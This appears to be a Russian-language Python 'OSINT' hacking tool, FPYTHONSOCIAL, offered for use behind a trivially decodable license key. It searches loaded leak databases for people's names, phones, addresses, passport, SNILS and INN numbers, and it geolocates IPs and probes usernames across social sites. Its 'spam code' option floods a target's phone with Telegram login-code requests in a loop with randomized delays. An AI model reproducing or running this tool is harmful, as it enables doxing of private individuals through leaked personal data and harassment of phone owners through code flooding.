#!/usr/bin/env python3
import subprocess, sys, importlib, os, time, random, shutil, re, json, base64, hashlib, sqlite3
from datetime import datetime
from urllib.parse import urlparse

required_packages = ['requests', 'whois', 'phonenumbers']
for package in required_packages:
    try:
        importlib.import_module(package.replace('-', '_'))
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

import requests
import whois
import phonenumbers
from phonenumbers import carrier, geocoder, timezone

ENCRYPTED_KEY = "UFlUSE9OU09DSUFMIEtFWQ=="
def check_key(input_key):
    try:
        decrypted = base64.b64decode(ENCRYPTED_KEY).decode('utf-8')
        return input_key.strip() == decrypted
    except:
        return False

SKULL = r"""
             ⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣄⡀                             
         ⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀                          
      ⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀                       
     ⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄                     
    ⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆                  
   ⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄                
  ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧               
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿               
 ⢻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⠘              
  ⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇                
 ⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿                  
 ⠈⣿⣿⣷⠀⠀⠀⠀⠀⣀⣴⣿⣿⡏⠘⣿⣿⣷⣤⡀⠀⠀⠀⠀⣰⣿⣿⣇                  
⢠⣿⣿⣿⣷⣤⣤⣤⣾⣿⣿⣿⡟⠀⠀⢸⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⣿                  
⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟                   
  ⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋                     
"""

LOGO = r"""
███████╗██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗██╗ █████╗ ██╗     
██╔════╝██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║██╔════╝██╔════╝██╔════╝██║██╔══██╗██║     
█████╗  ██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║███████╗██║     ██║     ██║███████║██║     
██╔══╝  ██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║╚════██║██║     ██║     ██║██╔══██║██║     
██║     ██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║███████║╚██████╗╚██████╗██║██║  ██║███████╗
╚═╝     ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝
"""

AUTHOR = "@PythonSocial"
PURPLE = "\033[38;2;180;0;255m"
PURPLE_BOLD = "\033[38;2;220;50;255m"
PURPLE_DIM = "\033[38;2;100;0;150m"
RED = "\033[38;2;255;0;0m"
RESET = "\033[0m"
CLEAR = "\033[2J\033[H"
HOME = "\033[H"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

rain_running = True
def red_rain_fullscreen():
    global rain_running
    try:
        rows, cols = shutil.get_terminal_size()
    except:
        rows, cols = 30, 80
    drops = [[0] * cols for _ in range(rows)]
    chars = "0123456789"
    start_time = time.time()
    while rain_running and time.time() - start_time < 5:
        sys.stdout.write(HOME)
        for y in range(rows):
            line = ""
            for x in range(cols):
                if drops[y][x] == 0:
                    drops[y][x] = random.randint(1, 25)
                if random.random() < 0.03:
                    drops[y][x] = 0
                if drops[y][x] > 0:
                    drops[y][x] -= 1
                    char = random.choice(chars)
                    brightness = random.randint(180, 255)
                    line += f"\033[38;2;{brightness};0;0m{char}\033[0m"
                else:
                    line += " "
            print(line)
        sys.stdout.flush()
        time.sleep(0.04)

def startup_rain():
    clear_screen()
    red_rain_fullscreen()
    clear_screen()

def key_screen():
    clear_screen()
    print(f"{RED}{SKULL}{RESET}")
    print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
    print(f"{PURPLE_BOLD}   FPYTHONSOCIAL v26.0{RESET}")
    print(f"{PURPLE_DIM}   Введите лицензионный ключ для продолжения{RESET}")
    print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
    print()
    attempt = 0
    while attempt < 3:
        key = input(f"{PURPLE}┌─ Введите ключ: {RESET}").strip()
        if check_key(key):
            print(f"{PURPLE_BOLD}✅ Ключ принят! Загрузка...{RESET}")
            time.sleep(1)
            return True
        else:
            attempt += 1
            print(f"{RED}❌ Неверный ключ. Попытка {attempt} из 3.{RESET}")
            time.sleep(1)
            clear_screen()
            print(f"{RED}{SKULL}{RESET}")
            print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
            print(f"{PURPLE_BOLD}   FPYTHONSOCIAL v26.0{RESET}")
            print(f"{PURPLE_DIM}   Введите лицензионный ключ для продолжения{RESET}")
            print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
            print()
    print(f"{RED}❌ Превышено количество попыток. Выход.{RESET}")
    sys.exit(1)

class DB:
    def __init__(self):
        self.data = []
        self.files = []
    def load(self, fp):
        try:
            ext = os.path.splitext(fp)[1].lower()
            if ext == '.json':
                with open(fp, 'r', encoding='utf-8') as f:
                    self.data.extend(json.load(f))
            elif ext == '.csv':
                import csv
                with open(fp, 'r', encoding='utf-8') as f:
                    for row in csv.reader(f):
                        self.data.append(" ".join(row))
            elif ext == '.db':
                conn = sqlite3.connect(fp)
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                tables = cursor.fetchall()
                for table in tables:
                    table_name = table[0]
                    cursor.execute(f"SELECT * FROM {table_name}")
                    rows = cursor.fetchall()
                    for row in rows:
                        self.data.append(" ".join(str(col) for col in row))
                conn.close()
            else:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    self.data.extend([line.strip() for line in f if line.strip()])
            self.files.append(fp)
            return True
        except Exception as e:
            print(f"Ошибка загрузки {fp}: {e}")
            return False
    def search(self, q, st='all'):
        res = []
        q = q.lower().strip()
        if not q:
            return res
        for e in self.data:
            el = e.lower()
            if st == 'phone':
                clean = re.sub(r'[^0-9+]', '', e)
                if q in clean.lower():
                    res.append(e)
            elif st == 'email':
                if q in el and '@' in e:
                    res.append(e)
            elif st == 'name':
                if all(p in el for p in q.split()):
                    res.append(e)
            elif st == 'address':
                if q in el and any(x in el for x in ['ул','пр','д','кв']):
                    res.append(e)
            elif st == 'passport':
                if q in el and any(x in el for x in ['серия','паспорт']):
                    res.append(e)
            else:
                if q in el:
                    res.append(e)
        return res

db = DB()

def get_phone_info(phone):
    try:
        num = phonenumbers.parse(phone, None)
        country = geocoder.description_for_number(num, "ru")
        operator = carrier.name_for_number(num, "ru")
        tz = timezone.time_zones_for_number(num)
        return f"Страна: {country}\nОператор: {operator}\nЧасовой пояс: {tz}"
    except:
        return "Ошибка парсинга номера."

def spam_code_to_phone(phone, count=50):
    url = "https://my.telegram.org/auth/send_code"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    success = 0
    for i in range(count):
        try:
            data = {'phone': phone, '_': str(int(time.time()*1000)) + str(random.randint(1000,9999))}
            r = requests.post(url, data=data, headers=headers, timeout=5)
            if r.status_code == 200:
                success += 1
        except:
            pass
        if i % 10 == 0:
            print(f"Отправлено {i} запросов, успешно {success}")
        time.sleep(0.5 + random.random()*1.5)
    return f"Готово: {success} из {count} запросов."

def check_email_breach(email):
    try:
        url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
        r = requests.get(url, headers={'hibp-api-key': ''}, timeout=10)
        if r.status_code == 200:
            breaches = r.json()
            if breaches:
                return f"Найдено утечек: {len(breaches)}. Список: " + ", ".join([b['Name'] for b in breaches])
            else:
                return "Утечек не найдено."
        elif r.status_code == 404:
            return "Утечек не найдено."
        else:
            return f"Ошибка API: {r.status_code}"
    except Exception as e:
        return f"Ошибка: {e}"

def get_ip_info(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
        if r.status_code == 200:
            data = r.json()
            return f"IP: {data.get('ip')}\nГород: {data.get('city')}\nРегион: {data.get('region')}\nСтрана: {data.get('country')}\nОрганизация: {data.get('org')}\nПочтовый индекс: {data.get('postal')}\nКоординаты: {data.get('loc')}"
        else:
            return f"Ошибка API: {r.status_code}"
    except Exception as e:
        return f"Ошибка: {e}"

def whois_domain(domain):
    try:
        w = whois.whois(domain)
        result = []
        for key, value in w.items():
            if value:
                result.append(f"{key}: {value}")
        return "\n".join(result[:20])
    except Exception as e:
        return f"Ошибка WHOIS: {e}"

def search_username_all(username):
    sites = {
        'github': f'https://github.com/{username}',
        'twitter': f'https://twitter.com/{username}',
        'instagram': f'https://instagram.com/{username}',
        'vk': f'https://vk.com/{username}',
        'reddit': f'https://reddit.com/user/{username}',
        'youtube': f'https://youtube.com/@{username}',
        'tiktok': f'https://tiktok.com/@{username}',
        'telegram': f'https://t.me/{username}',
        'facebook': f'https://facebook.com/{username}',
        'linkedin': f'https://linkedin.com/in/{username}',
        'pinterest': f'https://pinterest.com/{username}',
        'twitch': f'https://twitch.tv/{username}',
        'spotify': f'https://open.spotify.com/user/{username}',
        'steam': f'https://steamcommunity.com/id/{username}',
        'xbox': f'https://xboxgamertag.com/{username}',
        'psn': f'https://psnprofiles.com/{username}',
        'hackernews': f'https://news.ycombinator.com/user?id={username}',
        'medium': f'https://medium.com/@{username}',
        'quora': f'https://quora.com/profile/{username}',
        'pastebin': f'https://pastebin.com/u/{username}'
    }
    found = []
    for site, url in sites.items():
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200:
                found.append(f"{site}: {url}")
        except:
            pass
    if found:
        return "Найдено на:\n" + "\n".join(found)
    else:
        return "Не найден нигде."

def check_password_breach(password):
    try:
        sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
        prefix = sha1[:5]
        suffix = sha1[5:]
        url = f"https://api.pwnedpasswords.com/range/{prefix}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            lines = r.text.splitlines()
            for line in lines:
                if line.startswith(suffix):
                    count = line.split(':')[1]
                    return f"Пароль найден в утечках {count} раз(а)."
            return "Пароль не найден в утечках."
        else:
            return f"Ошибка API: {r.status_code}"
    except Exception as e:
        return f"Ошибка: {e}"

def combined_analysis(email=None, phone=None, ip=None):
    result = []
    if email:
        result.append(f"Email {email}: {check_email_breach(email)}")
    if phone:
        result.append(f"Телефон {phone}: {get_phone_info(phone)}")
    if ip:
        result.append(f"IP {ip}: {get_ip_info(ip)}")
    return "\n\n".join(result)

def search_web(query):
    try:
        url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            return "Поиск в Google выполнен. Откройте браузер для просмотра результатов."
        else:
            return f"Ошибка: {r.status_code}"
    except Exception as e:
        return f"Ошибка: {e}"

def print_skull_right():
    skull_lines = SKULL.split('\n')
    try:
        cols = shutil.get_terminal_size().columns
    except:
        cols = 80
    for line in skull_lines:
        if line.strip():
            print(f"{' ' * (cols - len(line) - 2)}{RED}{line}{RESET}")
        else:
            print()

def print_header():
    clear_screen()
    logo_lines = LOGO.split('\n')
    skull_lines = SKULL.split('\n')
    max_lines = max(len(logo_lines), len(skull_lines))
    try:
        cols = shutil.get_terminal_size().columns
    except:
        cols = 80
    for i in range(max_lines):
        logo_part = logo_lines[i] if i < len(logo_lines) else ''
        skull_part = skull_lines[i] if i < len(skull_lines) else ''
        if skull_part.strip():
            skull_formatted = f"{RED}{skull_part}{RESET}"
        else:
            skull_formatted = ''
        print(f"{PURPLE}{logo_part}{RESET}{' ' * (cols - len(logo_part) - len(skull_part) - 2)}{skull_formatted}")
    print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
    print(f"{PURPLE_BOLD}   FPYTHONSOCIAL v26.0     {PURPLE_DIM}от {AUTHOR}{RESET}")
    print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
    print(f"{PURPLE_DIM}   Записей: {len(db.data)} | Файлов: {len(db.files)}{RESET}")
    print(f"{PURPLE_BOLD}{'═'*60}{RESET}")

def menu_loop():
    global db
    while True:
        print_header()
        items = [
            "1.ФИО", "2.Телефон", "3.Email", "4.Адрес", "5.Паспорт",
            "6.IP", "7.Логин", "8.Дата", "9.Авто", "10.СНИЛС",
            "11.ИНН", "12.ОКВЭД", "13.Компания", "14.Должность", "15.Telegram",
            "16.VK", "17.Instagram", "18.Twitter", "19.Домен", "20.Общий",
            "21.Загрузить", "22.Файлы", "23.Очистить",
            "24.Email-утечки", "25.IP-гео", "26.WHOIS", "27.Телефон-инфо", "28.Username-поиск",
            "29.Пароль-утечки", "30.Комбо", "31.Web-поиск", "32.Спам-кодом"
        ]
        for i in range(0, len(items), 4):
            row = items[i:i+4]
            line = ""
            for item in row:
                line += f"{PURPLE_BOLD}{item:<16}{RESET} "
            print(line)
        print()
        print(f"{PURPLE_DIM}  0-Выход{RESET}")
        print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
        choice = input(f"{PURPLE}┌─ Введите номер команды или запрос:{RESET}\n{PURPLE}└─> {RESET}").strip()

        if choice == '0':
            break
        elif choice == '21':
            fp = input("Путь к файлу: ").strip()
            if db.load(fp):
                print(f"Загружено. Всего: {len(db.data)}")
            time.sleep(1)
            continue
        elif choice == '22':
            print("Файлы:")
            for f in db.files:
                print(f"  {f}")
            print(f"Всего записей: {len(db.data)}")
            time.sleep(1)
            continue
        elif choice == '23':
            db.data = []
            db.files = []
            print("База очищена.")
            time.sleep(1)
            continue
        elif choice == '24':
            email = input("Введите email: ").strip()
            if email:
                print(check_email_breach(email))
            input("Нажмите Enter...")
            continue
        elif choice == '25':
            ip = input("Введите IP: ").strip()
            if ip:
                print(get_ip_info(ip))
            input("Нажмите Enter...")
            continue
        elif choice == '26':
            domain = input("Введите домен (example.com): ").strip()
            if domain:
                print(whois_domain(domain))
            input("Нажмите Enter...")
            continue
        elif choice == '27':
            phone = input("Введите номер телефона (+79991234567): ").strip()
            if phone:
                print(get_phone_info(phone))
            input("Нажмите Enter...")
            continue
        elif choice == '28':
            username = input("Введите username: ").strip()
            if username:
                print(search_username_all(username))
            input("Нажмите Enter...")
            continue
        elif choice == '29':
            password = input("Введите пароль: ").strip()
            if password:
                print(check_password_breach(password))
            input("Нажмите Enter...")
            continue
        elif choice == '30':
            email = input("Email (или Enter): ").strip() or None
            phone = input("Телефон (или Enter): ").strip() or None
            ip = input("IP (или Enter): ").strip() or None
            if email or phone or ip:
                print(combined_analysis(email, phone, ip))
            input("Нажмите Enter...")
            continue
        elif choice == '31':
            query = input("Введите запрос для поиска: ").strip()
            if query:
                print(search_web(query))
            input("Нажмите Enter...")
            continue
        elif choice == '32':
            phone = input("Введите номер для спама кодом (+79991234567): ").strip()
            if phone:
                count = int(input("Количество запросов (по умолчанию 50): ") or "50")
                print(spam_code_to_phone(phone, count))
            input("Нажмите Enter...")
            continue

        if not db.data:
            print("База пуста! Загрузите файл (21).")
            time.sleep(1)
            continue
        types_map = {
            '1':'name','2':'phone','3':'email','4':'address','5':'passport',
            '6':'all','7':'all','8':'all','9':'all','10':'all',
            '11':'all','12':'all','13':'all','14':'all','15':'all',
            '16':'all','17':'all','18':'all','19':'all','20':'all'
        }
        st = types_map.get(choice, 'all')
        query = input(f"{PURPLE}┌─ Введите запрос:{RESET}\n{PURPLE}└─> {RESET}").strip()
        if not query:
            continue
        results = db.search(query, st)
        print(f"\n{PURPLE_BOLD}=== Результаты по '{query}' ({len(results)} записей) ==={RESET}")
        if not results:
            print(f"{PURPLE_DIM}Ничего не найдено.{RESET}")
        else:
            for i, r in enumerate(results[:30], 1):
                print(f"{PURPLE}[{i:2}]{RESET} {r}")
            if len(results) > 30:
                print(f"{PURPLE_DIM}... и ещё {len(results)-30} записей.{RESET}")
        print(f"{PURPLE_BOLD}{'═'*60}{RESET}")
        input(f"{PURPLE_DIM}Нажмите Enter для продолжения...{RESET}")

if __name__ == '__main__':
    try:
        startup_rain()
        key_screen()
        menu_loop()
        print("Выход из программы.")
    except KeyboardInterrupt:
        print("\nПрервано пользователем.")
    except Exception as e:
        print(f"Ошибка: {e}")
    finally:
        input("Нажмите Enter для завершения...")
